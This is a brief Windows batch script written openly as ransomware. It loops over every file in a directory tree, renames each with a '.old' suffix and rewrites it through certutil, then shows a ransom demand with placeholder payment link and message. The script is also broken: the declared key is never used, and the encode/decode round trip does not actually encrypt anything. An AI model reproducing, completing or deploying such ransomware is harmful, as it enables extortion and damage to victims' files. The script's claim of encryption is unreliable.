@echo off
setlocal enabledelayedexpansion

REM Define the encryption key
set "key=YOUR_ENCRYPTION_KEY_HERE"

REM Encrypt all files on the computer
for /r %%i in (*) do (
    certutil -encode %%i "%temp%\encrypted_temp" >nul
    ren "%%i" "%%~nxi.old"
    certutil -decode "%temp%\encrypted_temp" "%%i" >nul
    del "%temp%\encrypted_temp"
)

REM Display message and provide link
echo Your files have been encrypted. Pay the ransom to get the decryption key.
echo Payment link: YOUR_PAYMENT_LINK
echo Message: YOUR_MESSAGE

pause
